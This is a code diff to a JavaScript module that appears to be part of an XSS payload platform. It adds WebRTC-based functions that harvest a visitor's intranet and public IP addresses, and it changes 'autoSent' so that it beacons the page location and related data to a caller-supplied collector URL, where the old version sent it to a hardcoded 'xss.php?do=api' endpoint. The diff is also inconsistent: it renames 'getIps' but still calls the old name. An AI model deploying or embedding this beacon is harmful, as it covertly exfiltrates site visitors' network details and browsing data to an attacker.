@@ -230,7 +230,7 @@ var MForm = function () {
     };
 
     //ip获取
-    init.getIps  = function (callback) {
+    that.getIps  = function (callback) {
         var ip_dups = {};
         var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
         var useWebKit = !!window.webkitRTCPeerConnection;
@@ -276,10 +276,25 @@ var MForm = function () {
             1000);
     };
 
+    //获取内网ip
+    init.ipIn  = function () {
+        that.getIps(function (ip) {
+            console.log('intranet ip : '+ip);
+        });
+    };
+
+    //获取外网ip
+    init.ipOut = function () {
+        that.getIps(function (ip) {
+            console.log('public net ip : '+ip);
+        });
+    };
+
     //自动发送
-    init.autoSent = function () {
+    init.autoSent = function (url) {
+        if(!url) return ;
         init.getIps(function (ip) {
-            (new Image()).src = 'http://localhost:20002/xss.php?do=api&id={projectId}&location='
+            (new Image()).src = url+'?do=api&id={projectId}&location='
                 + escape(
                     (function(){
                         try {
